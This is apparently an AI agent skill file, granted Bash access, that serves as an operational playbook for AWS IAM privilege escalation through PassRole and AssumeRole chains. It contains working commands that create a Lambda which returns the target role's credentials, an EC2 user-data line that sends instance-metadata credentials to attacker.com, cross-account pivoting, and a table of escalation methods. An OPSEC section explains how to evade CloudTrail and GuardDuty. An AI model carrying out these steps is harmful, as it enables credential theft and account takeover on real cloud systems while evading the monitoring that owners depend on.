---
name: aws-iam-passrole-chain
description: "AWS IAM privilege escalation via `iam:PassRole` chains — Lambda/Glue/Sagemaker/EC2/ECS PassRole to a higher-priv role, AssumeRole chains across accounts, sts:GetCallerIdentity recon, account hijack via legacy root-mfa-bypass."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "aws iam passrole assumerole privilege escalation lambda glue sagemaker ec2 ecs role chain account pivot sts getcalleridentity"
  subdomain: cloud
  tags: aws, iam, privilege-escalation, passrole
  mitre_attack: T1078.004, T1098, T1550.001
---

# AWS IAM PassRole Chain

You have AWS credentials (env vars, ~/.aws/credentials, EC2 IMDS, ECS task role, leaked GitHub keys). Find the path to higher privilege via PassRole.

## Enumerate

```bash
aws sts get-caller-identity                                  # who are you?
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-user-policies --user-name <you>
aws iam get-account-summary

# Or for a role (e.g., EC2 instance):
aws sts get-caller-identity                                  # check Arn = role
ROLE=$(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-attached-role-policies --role-name $ROLE
aws iam list-role-policies --role-name $ROLE
```

Use [Pacu](https://github.com/RhinoSecurityLabs/pacu) — `enum_permissions` — for the canonical enumeration.

## Phase 1: Identify your PassRole targets

```bash
# What roles can your principal PassRole?
# Check policy for iam:PassRole — note the Resource:
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/<your-policy> --version-id v1 \
  | jq '.PolicyVersion.Document.Statement[] | select(.Action[]?=="iam:PassRole" or .Action=="iam:PassRole")'

# List all roles (need iam:ListRoles)
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output text
```

## Phase 2: PassRole → execute as higher-priv role

### Lambda — most common path
```bash
# Create a Lambda that runs as TARGET_ROLE and returns its credentials
cat > pwn.py <<'EOF'
def lambda_handler(event, context):
    import os
    return {
        "AKI": os.environ["AWS_ACCESS_KEY_ID"],
        "SAK": os.environ["AWS_SECRET_ACCESS_KEY"],
        "TOK": os.environ["AWS_SESSION_TOKEN"],
    }
EOF
zip pwn.zip pwn.py
aws lambda create-function --function-name pwn --runtime python3.11 \
  --role arn:aws:iam::ACCT:role/TARGET_ROLE --handler pwn.lambda_handler \
  --zip-file fileb://pwn.zip
aws lambda invoke --function-name pwn /tmp/o.json && cat /tmp/o.json
# /tmp/o.json now contains TARGET_ROLE credentials
```

### Glue Dev Endpoint
```bash
aws glue create-dev-endpoint --endpoint-name pwn --role-arn arn:aws:iam::ACCT:role/TARGET_ROLE
# SSH into it; whoami is TARGET_ROLE
```

### EC2 Instance Profile
```bash
aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --instance-type t2.micro \
  --iam-instance-profile Name=TARGET_PROFILE --user-data "$(printf '#!/bin/bash\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/TARGET_ROLE > /tmp/c.json && curl -X POST -d @/tmp/c.json https://attacker.com/x')"
```

### SageMaker Notebook
```bash
aws sagemaker create-notebook-instance --notebook-instance-name pwn --instance-type ml.t2.medium \
  --role-arn arn:aws:iam::ACCT:role/TARGET_ROLE
# Then open the notebook URL; in a cell: !aws sts get-caller-identity
```

## Phase 3: AssumeRole chains across accounts

```bash
# If you have sts:AssumeRole on a cross-account role:
aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCT:role/CROSSACCT_ROLE --role-session-name pwn
# Use the returned Credentials for the next hop.

# Chain depth — repeat assume-role with each new principal.
```

## Phase 4: Privilege escalation classes (Pacu — `iam__privesc_scan`)

| Method | Required permission |
|---|---|
| `CreateNewPolicyVersion` | `iam:CreatePolicyVersion` on a policy attached to a higher-priv user |
| `SetExistingDefaultPolicyVersion` | `iam:SetDefaultPolicyVersion` |
| `CreateAccessKey` | `iam:CreateAccessKey` on a higher-priv user |
| `CreateLoginProfile` | `iam:CreateLoginProfile` — log in as the target user via console |
| `UpdateLoginProfile` | `iam:UpdateLoginProfile` — reset the target user's console password |
| `AttachUserPolicy` | `iam:AttachUserPolicy` — attach `AdministratorAccess` to yourself |
| `AttachGroupPolicy` | `iam:AttachGroupPolicy` |
| `AttachRolePolicy` | `iam:AttachRolePolicy` |
| `PutUserPolicy` | `iam:PutUserPolicy` — inline policy bypass |
| `AddUserToGroup` | `iam:AddUserToGroup` — add yourself to admins |
| `UpdateAssumeRolePolicy` | `iam:UpdateAssumeRolePolicy` — make a role assumable by you |
| `PassExistingRoleToNewLambda` | `iam:PassRole` + `lambda:CreateFunction/InvokeFunction` |
| `PassExistingRoleToNewGlueDevEndpoint` | as above for Glue |
| `EditExistingLambdaFunctionWithRole` | `lambda:UpdateFunctionCode` on an existing Lambda |
| `PassExistingRoleToNewCloudFormation` | `iam:PassRole` + `cloudformation:CreateStack` |
| `PassExistingRoleToNewDataPipeline` | as above for Data Pipeline |
| `CodeStarCreateProjectFromTemplate` | exotic — older accounts |

## OPSEC

- Every IAM and STS call is in CloudTrail. Volume of `assume-role` is normal — `create-function` with a new role is not.
- GuardDuty has finding types `Recon:IAMUser/ResourceConsumption` and `Privilege Escalation:IAMUser/AnomalousBehavior`. Move slowly.
- For low-noise: use existing Lambda functions (replace their code) rather than creating new ones — `UpdateFunctionCode` is far more common in normal traffic.
- Sensitive: GuardDuty flags `AwsApiCall: PutEventSelectors / StopLogging` on CloudTrail — don't try to silence telemetry.

## References

- Pacu (RhinoSecurityLabs) — automated enum + privesc
- "AWS IAM Privilege Escalation Methods" — Spencer Gietzen, RhinoSecurityLabs
- ScoutSuite, Prowler — defender perspective
- DEFCON 30 "Cloud Village" — recurring AWS IAM track
